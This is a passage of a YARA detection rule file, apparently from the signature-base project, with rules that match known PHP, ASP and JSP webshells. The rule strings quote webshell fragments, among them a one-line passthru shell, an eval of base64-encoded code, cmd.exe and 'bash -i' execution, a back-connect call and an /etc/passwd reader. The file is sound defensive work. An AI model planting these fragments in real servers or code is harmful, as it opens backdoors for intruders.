		$s1 = "String password=request.getParameter(\"password\");" fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
		$s12 = "password = (String)session.getAttribute(\"password\");" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Uploader
{
	meta:
		description = "PHP Webshells Github Archive - file Uploader.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c68e15d9-865e-5269-a91c-00619fe76305"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6044-L6055"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
		logic_hash = "c4b915f60a952131caa2c4f5bb2eea85ef25f27cabb8ad36a6bb928433558954"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Kral
{
	meta:
		description = "PHP Webshells Github Archive - file kral.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6056-L6072"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
		logic_hash = "0aded226f4e54c0169b9fbda91458f581ea47f9f8bda61a350b5e6f8b60931f3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$adres=gethostbyname($ip);" fullword
		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Cgitelnet
{
	meta:
		description = "PHP Webshells Github Archive - file cgitelnet.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b02d8549-ebfe-522c-9a6d-8657273da3ed"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6073-L6087"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "72e5f0e4cd438e47b6454de297267770a36cbeb3"
		logic_hash = "e9b7096d5a19c9d5423bbfe125ae0347853919ab092efa98f0687a5d0cf68953"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "# Author Homepage: http://www.rohitab.com/" fullword
		$s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
		$s18 = "# in a command line on Windows NT." fullword
		$s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a504442f-85f2-55a1-8a07-1e0faccf8bc0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6109-L6123"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
		logic_hash = "fbe1f77e00fbc4e58cbad564e2d96c0381765ac799dfdf6cc2580428c68f97a5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ntdaddy_V1_9
{
	meta:
		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a175fd28-5dc2-5827-87f0-4117e889e90e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6124-L6138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
		logic_hash = "fdf8b4bb4980e588ad5ccee2d047660980d39f38617f887c5762dcdb0b858267"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s13 = "<form action=ntdaddy.asp method=post>" fullword
		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_C99Madshell_V__2_0_Madnet_Edition
{
	meta:
		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
		author = "Florian Roth (Nextron Systems)"
		id = "51db0495-14f3-527e-865b-1405db57ff27"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6186-L6201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
		logic_hash = "7cf825a604783ebc74b1dca53aaff5c886957c562e11276f2acce5ff1f6ab991"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"\";  //Pass" fullword
		$s3 = "$login = \"\"; //Login" fullword
		$s4 = "//Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Cmdasp_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "184b1731-31a9-5040-aa25-d145e8064758"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6202-L6221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
		logic_hash = "0fd9c7e83ad9ddf5cf88f1d1573324d9f24ae03a1951446fe11c116fd0cf4932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
		$s6 = "' --------------------o0o--------------------" fullword
		$s8 = "' File: CmdAsp.asp" fullword
		$s11 = "<-- CmdAsp.asp -->" fullword
		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_README
{
	meta:
		description = "PHP Webshells Github Archive - file README.md"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6239-L6251"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
		logic_hash = "aa8a9be74bbac08518d5ba442aa6fa37d3f1b255df48b49ccb9842f5728a49d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
		$s1 = "php-webshells" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Backupsql
{
	meta:
		description = "PHP Webshells Github Archive - file backupsql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "15d6e967-1e53-53b4-a2cf-7786452495d4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6252-L6267"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
		logic_hash = "0126bfad6eb3861e8322ac3e11b4fd95bc8b88597d916e66c6646d7d5529c1d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_AK_74_Security_Team_Web_Shell_Beta_Version
{
	meta:
		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
		author = "Florian Roth (Nextron Systems)"
		id = "e93a6ac3-080f-53d3-8368-b9feb509a2ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6268-L6281"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
		logic_hash = "4fbf8f5cab8593fd88e5a430b849e61d7d663c13700f459aa516c5b337d5438b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Accept_Language
{
	meta:
		description = "PHP Webshells Github Archive - file accept_language.php"
		author = "Florian Roth (Nextron Systems)"
		id = "343ed2a4-4bed-5e73-8d05-f9573b0147af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6299-L6310"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
		logic_hash = "6d45071722268f5b39b1486a7dce883ecefb2b3c9993357b7b58bd603ff1c40d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_529
{
	meta:
		description = "PHP Webshells Github Archive - file 529.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6311-L6328"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
		logic_hash = "f46b84d51077f157c83cd01534dfe7f9cd0d9ef04ad9935ced22d2abc873c171"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
		$s10 = "This Exploit Was Edited By KingDefacer" fullword
		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
		$s20 = "while($level--) chdir(\"..\"); " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Tryag
{
	meta:
		description = "PHP Webshells Github Archive - file tryag.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6343-L6358"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
		logic_hash = "2af3bbe8d1940e60843f3f5d40c9c6550e76df21568c374f7a871f73aeefae44"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Qsd_Php_Backdoor
{
	meta:
		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f8208851-159c-5d0b-91ad-478aeb4fc9fd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6375-L6389"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
		logic_hash = "3ef7b67cd60370a99fdfa6fd614f71ee314af27c9d983383dde8f03a127a28b3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Spygrup
{
	meta:
		description = "PHP Webshells Github Archive - file spygrup.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6390-L6404"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
		logic_hash = "5981f8cc1a98f799b1573cf73297383f995acf1c40f0227ac10302dc4d6fd6cc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
		$s18 = "By KingDefacer From Spygrup.org>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Ayyildiz_Tim___AYT__Shell_V_2_1_Biz
{
	meta:
		description = "PHP Webshells Github Archive - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.php"
		author = "Florian Roth (Nextron Systems)"
		id = "fdd9bae9-80f3-5200-b922-e7d194009af8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6420-L6434"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5fe8c1d01dc5bc70372a8a04410faf8fcde3cb68"
		logic_hash = "2d096baad162c0e3e01732007a3be2804155e614a8fa4cd2d5dd3a7ac808fb49"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
		$s11 = "directory... Trust me - it works :-) */" fullword
		$s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
		$s16 = "} else if ($command == 'ls') {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Gamma_Web_Shell
{
	meta:
		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "43b4fc9f-8897-5553-8846-29d307efa885"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6435-L6449"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
		logic_hash = "1de868c4948a95272d288aeba3ac38b84bf6b33ede6b3b600b32530c85586404"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
		$s20 = "my $command = $self->query('command');" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Aspydrv
{
	meta:
		description = "PHP Webshells Github Archive - file aspydrv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6450-L6465"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
		logic_hash = "314fd671b163b9904cc78cb3a5858f5b1e3dfae9d520d5ebc545a7abd922e9f7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
		$s20 = "' ---Copy Too Folder routine Start" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_G00Nshell_V1_3
{
	meta:
		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "61a09576-7e62-5a30-a52c-492b81b96322"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6482-L6497"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
		logic_hash = "2ecb3ce2aa43a99552fb26e610c35bdb04f4ff0dc75c867e4327d6e27eed0177"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Cw
{
	meta:
		description = "PHP Webshells Github Archive - file cw.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6530-L6546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
		logic_hash = "52bfb14f4d5d3df787ce7782cbbee25ea1556758eed48e3001c8a3f35a541526"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// Dump Database [pacucci.com]" fullword
		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Include_W_Shell
{
	meta:
		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a80ca446-6612-51b4-99a7-8a8d8e6ee196"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6547-L6560"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1a7f4868691410830ad954360950e37c582b0292"
		logic_hash = "2be144060d4fdaee38214dc2eba80c2a6fd3699060d274e66356fd5a08c9be4b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Mysql_Tool
{
	meta:
		description = "PHP Webshells Github Archive - file mysql_tool.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a22a0a5c-a686-517e-b1f9-279edab0616b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6561-L6573"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
		logic_hash = "611636b3fa9a3163574b18cf8eacebea9733a1ad381261387f79a532b003e8fd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Phpspy_Ver_2006
{
	meta:
		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
		author = "Florian Roth (Nextron Systems)"
		id = "adbb1963-31c8-5540-a679-c75b1101c163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6574-L6588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
		logic_hash = "69bd2c387b0e676168116f3b3c3c081e08fd555cc6bc9a94b9c8ef97f194b09f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Zyklonshell
{
	meta:
		description = "PHP Webshells Github Archive - file ZyklonShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4d7ff3e5-4940-52c8-b045-5db1523f70c2"
		date = "2025-03-29"
